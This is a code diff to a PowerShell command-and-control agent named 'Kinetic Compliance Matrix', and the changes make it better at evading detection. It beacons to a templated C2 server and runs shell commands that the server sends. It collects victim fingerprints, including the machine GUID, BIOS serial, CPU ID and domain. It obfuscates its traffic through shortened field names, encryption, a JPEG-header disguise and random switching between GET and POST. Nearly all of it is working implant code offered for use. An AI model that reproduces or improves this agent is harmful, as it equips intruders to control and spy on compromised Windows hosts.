@@ -1,4 +1,4 @@
-# Kinetic Compliance Matrix - Simplified PowerShell Agent
+# Kinetic Compliance Matrix - OPSEC-Enhanced PowerShell Agent
 
 # Set TLS 1.2 for compatibility
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -13,6 +13,8 @@ $commandResultPath = '{{CMD_RESULT_PATH}}'
 # Initialize encryption key as null - will be obtained from server
 $global:encryptionKey = $null
 $global:firstContact = $true  # Flag to track if this is the first contact
+$global:systemInfoSent = $false  # Flag to track if system info has been sent
+$global:clientID = $null  # Store client ID received from server (only used for first contact)
 
 {{PATH_ROTATION_CODE}}
 
@@ -168,6 +170,38 @@ function Get-SystemIdentification {
         $systemInfo.RotationId = $global:currentRotationId
     }
     
+    # Try to get more detailed machine information
+    try {
+        # Add machine GUID if available (good for correlation)
+        $machineGuid = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid" -ErrorAction SilentlyContinue
+        if ($machineGuid) {
+            $systemInfo.MachineGuid = $machineGuid.MachineGuid
+        }
+        
+        # Add BIOS serial
+        $bios = Get-WmiObject -Class Win32_BIOS -ErrorAction SilentlyContinue
+        if ($bios) {
+            $systemInfo.BiosSerial = $bios.SerialNumber
+        }
+        
+        # Add processor ID
+        $cpu = Get-WmiObject -Class Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
+        if ($cpu) {
+            $systemInfo.ProcessorId = $cpu.ProcessorId
+        }
+        
+        # Add domain information
+        $computerSystem = Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue
+        if ($computerSystem) {
+            $systemInfo.Domain = $computerSystem.Domain
+            $systemInfo.PartOfDomain = $computerSystem.PartOfDomain
+        }
+    }
+    catch {
+        # If detailed info collection fails, continue with basic info
+        Write-Host "Warning: Could not collect some system details: $_"
+    }
+    
     # Convert to JSON
     $jsonInfo = ConvertTo-Json -InputObject $systemInfo -Compress
     return $jsonInfo
@@ -214,7 +248,6 @@ function Process-Commands {
                 $resultObj = @{
                     timestamp = $timestamp
                     result = $result
-                    system_info = Get-SystemIdentification
                 }
                 
                 # First prepare the JSON
@@ -246,8 +279,9 @@ function Process-Commands {
                         else {
                             $encryptedResult = Encrypt-Data -PlainText $resultJson
                             $encryptedObj = @{
-                                data = $encryptedResult
-                                token = Get-RandomToken  # Add random token
+                                d = $encryptedResult  # Shortened from 'data'
+                                t = Get-RandomToken    # Shortened from 'token'
+                                c = $global:clientID   # Shortened from 'client_id', only for first contact
                             }
                             $encryptedJson = ConvertTo-Json -InputObject $encryptedObj -Compress
                             $resultClient.UploadString($resultUrl, $encryptedJson)
@@ -270,6 +304,13 @@ function Process-Commands {
                 # Handle key rotation command from operator
                 $success = Update-EncryptionKey -Base64Key $args
                 $result = if ($success) { "Key rotation successful - using new encryption key" } else { "Key rotation failed" }
+            }
+            elseif ($commandType -eq "system_info_request") {
+                # Now that we have secure channel, send full system info
+                $systemInfo = Get-SystemIdentification
+                $result = $systemInfo
+                $global:systemInfoSent = $true
+                Write-Host "System information sent after secure channel established"
             }
             elseif ($commandType -eq "execute") {
                 # Execute shell command
@@ -325,9 +366,15 @@ function Process-Commands {
             # Create payload with encrypted data (JPEG header is now added inside Encrypt-Data)
             # Include random token field in the response
             $payload = @{
-                data = $encryptedResult
-                token = Get-RandomToken  # Add random token
+                d = $encryptedResult        # Shortened from 'data'
+                t = Get-RandomToken         # Shortened from 'token'
             }
+            
+            # Add client ID only for first contact communication
+            if ($global:firstContact) {
+                $payload.c = $global:clientID  # Shortened from 'client_id'
+            }
+            
             $payloadJson = ConvertTo-Json -InputObject $payload -Compress
             
             Write-Host "Sending command result to $resultUrl"
@@ -361,9 +408,15 @@ function Process-Commands {
             
             # Create payload with encrypted data and random token
             $payload = @{
-                data = $encryptedResult
-                token = Get-RandomToken
+                d = $encryptedResult        # Shortened from 'data'
+                t = Get-RandomToken         # Shortened from 'token'
             }
+            
+            # Add client ID only for first contact communication
+            if ($global:firstContact) {
+                $payload.c = $global:clientID  # Shortened from 'client_id'
+            }
+            
             $payloadJson = ConvertTo-Json -InputObject $payload -Compress
             
             Write-Host "Sending error result to $resultUrl"
@@ -383,12 +436,24 @@ function Send-GetBeacon {
     param(
         [string]$Url,
         [string]$EncodedData,
-        [string]$Token
+        [string]$Token,
+        [bool]$IsFirstContact = $false
     )
     
     try {
-        # Create a query string with data and token
-        $queryString = "?data=$([System.Uri]::EscapeDataString($EncodedData))&token=$([System.Uri]::EscapeDataString($Token))"
+        # Create a query string with data and token (shortened field names)
+        $queryString = "?d=$([System.Uri]::EscapeDataString($EncodedData))&t=$([System.Uri]::EscapeDataString($Token))"
+        
+        # Add first_contact flag if this is the first contact
+        if ($IsFirstContact) {
+            $queryString += "&i=true"  # Shortened from 'init'
+        }
+        
+        # Include client ID in query string if this is first contact
+        if ($IsFirstContact -and $global:clientID) {
+            $queryString += "&c=$([System.Uri]::EscapeDataString($global:clientID))"  # Shortened from 'client_id'
+        }
+        
         $fullUrl = "$Url$queryString"
         
         # Create web client and set headers
@@ -412,7 +477,8 @@ function Send-GetBeacon {
 function Send-PostBeacon {
     param(
         [string]$Url,
-        [string]$PayloadJson
+        [string]$PayloadJson,
+        [bool]$IsFirstContact = $false
     )
     
     try {
@@ -454,9 +520,9 @@ function Process-ServerResponse {
     $serverData = $ResponseData
     
     # Check for rotation information
-    if ($global:pathRotationEnabled -and $serverData.rotation_info) {
-        $rotationId = $serverData.rotation_info.current_rotation_id
-        $nextRotation = $serverData.rotation_info.next_rotation_time
+    if ($global:pathRotationEnabled -and $serverData.r) {  # 'r' is shortened from 'rotation_info'
+        $rotationId = $serverData.r.cid  # 'cid' is shortened from 'current_rotation_id'
+        $nextRotation = $serverData.r.nrt  # 'nrt' is shortened from 'next_rotation_time'
         
         if ($rotationId -and [int]$rotationId -ne $global:currentRotationId) {
             # Server has newer rotation, we need to get paths
@@ -470,16 +536,22 @@ function Process-ServerResponse {
         }
     }
     
+    # Save client ID if provided by server (only during first contact)
+    if ($serverData.c) {  # 'c' is shortened from 'client_id'
+        $global:clientID = $serverData.c
+        Write-Host "Received client ID from server: $global:clientID"
+    }
+    
     # Check for key operation status
-    if ($serverData.first_contact -eq $true) {
+    if ($serverData.f -eq $true) {  # 'f' is shortened from 'first_contact'
         Write-Host "First contact with server established - key exchange in progress"
     }
     
-    if ($serverData.key_issuance -eq $true) {
+    if ($serverData.ki -eq $true) {  # 'ki' is shortened from 'key_issuance'
         Write-Host "Key issuance indicated in response"
     }
     
-    if ($serverData.key_rotation -eq $true) {
+    if ($serverData.kr -eq $true) {  # 'kr' is shortened from 'key_rotation'
         Write-Host "Key rotation indicated in response"
     }
 }
@@ -513,46 +585,58 @@ function Start-AgentLoop {
             }
             $beaconUrl = "http://$serverAddress$currentBeaconPath"
             
-            # Prepare the system info data
-            $systemInfoRaw = Get-SystemIdentification
-            
             # Generate random token for this request
             $randomToken = Get-RandomToken
             
-            # Create beacon payload with different format based on encryption status
+            # For first contact, send minimal information to establish secure channel first
             if ($global:firstContact) {
-                # First contact - simpler payload
+                # For first contact, only send a dummy payload with token
+                # We won't send any system information in the first contact
                 $beaconPayload = @{
-                    data = $systemInfoRaw
-                    first_contact = $true
-                    token = $randomToken  # Add random token
+                    d = "{}"  # Empty JSON as placeholder, shortened from 'data'
+                    f = $true  # Shortened from 'first_contact'
+                    t = $randomToken  # Shortened from 'token'
                 }
-            } else {
-                # Established contact - encrypt data and don't include client ID
+                
+                # Add client ID if we have one from previous exchange
+                if ($global:clientID) {
+                    $beaconPayload.c = $global:clientID  # Shortened from 'client_id'
+                }
+                
+                $beaconJson = ConvertTo-Json -InputObject $beaconPayload -Compress
+                
+                # Always use POST for first contact
+                $response = Send-PostBeacon -Url $beaconUrl -PayloadJson $beaconJson -IsFirstContact $true
+            }
+            # For established contacts or after secure channel is established
+            else {
+                # Prepare the system info data - only after encryption is established
+                $systemInfoRaw = Get-SystemIdentification
+                
+                # Established contact - encrypt data 
                 $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfoRaw
                 $beaconPayload = @{
-                    data = $encryptedSystemInfo
-                    token = $randomToken  # Add random token
+                    d = $encryptedSystemInfo  # Shortened from 'data'
+                    t = $randomToken          # Shortened from 'token'
                 }
                 
                 # Include rotation ID only if path rotation is enabled
                 if ($global:pathRotationEnabled) {
-                    $beaconPayload.rotation_id = $global:currentRotationId
+                    $beaconPayload.r = $global:currentRotationId  # Shortened from 'rotation_id'
                 }
-            }
-            
-            $beaconJson = ConvertTo-Json -InputObject $beaconPayload -Compress
-            
-            # Randomly decide between GET and POST for this beacon
-            # First contact always uses POST for simplicity
-            $useGetMethod = (-not $global:firstContact) -and ((Get-Random -Minimum 1 -Maximum 100) -le 50)
-            
-            # Beacon to the C2 server using either GET or POST
-            $response = ""
-            if ($useGetMethod) {
-                $response = Send-GetBeacon -Url $beaconUrl -EncodedData $beaconPayload.data -Token $randomToken
-            } else {
-                $response = Send-PostBeacon -Url $beaconUrl -PayloadJson $beaconJson
+                
+                $beaconJson = ConvertTo-Json -InputObject $beaconPayload -Compress
+                
+                # Randomly decide between GET and POST for established connections
+                $useGetMethod = ((Get-Random -Minimum 1 -Maximum 100) -le 50)
+                
+                # Beacon to the C2 server using either GET or POST
+                $response = ""
+                if ($useGetMethod) {
+                    $response = Send-GetBeacon -Url $beaconUrl -EncodedData $beaconPayload.d -Token $randomToken
+                } else {
+                    $response = Send-PostBeacon -Url $beaconUrl -PayloadJson $beaconJson
+                }
             }
             
             # Process response data
@@ -564,19 +648,19 @@ function Start-AgentLoop {
             $usingFallbackPaths = $false
             
             # Process response if it contains commands
-            if ($responseObject.commands -and ($responseObject.commands.Length -gt 0 -or $responseObject.encrypted -eq $true)) {
+            if ($responseObject.com -and ($responseObject.com.Length -gt 0 -or $responseObject.e -eq $true)) {  # 'com' is shortened from 'commands', 'e' from 'encrypted'
                 # Check for special flag that indicates first contact/key issuance
-                $isFirstContact = $responseObject.first_contact -eq $true
+                $isFirstContact = $responseObject.f -eq $true  # 'f' is shortened from 'first_contact'
                 
                 # If it's first contact, the commands are not encrypted
                 if ($isFirstContact) {
                     # Process commands directly
-                    Process-Commands -Commands $responseObject.commands
+                    Process-Commands -Commands $responseObject.com  # 'com' is shortened from 'commands'
                 }
                 else {
                     # For established sessions, decrypt the commands if they're encrypted
-                    if ($responseObject.encrypted -eq $true) {
-                        $decryptedResponse = Decrypt-Data -EncryptedBase64 $responseObject.commands
+                    if ($responseObject.e -eq $true) {  # 'e' is shortened from 'encrypted'
+                        $decryptedResponse = Decrypt-Data -EncryptedBase64 $responseObject.com
                         try {
                             $commands = ConvertFrom-Json -InputObject $decryptedResponse
                             Process-Commands -Commands $commands
@@ -587,7 +671,7 @@ function Start-AgentLoop {
                     }
                     else {
                         # Handle unencrypted commands
-                        Process-Commands -Commands $responseObject.commands
+                        Process-Commands -Commands $responseObject.com  # 'com' is shortened from 'commands'
                     }
                 }
             }
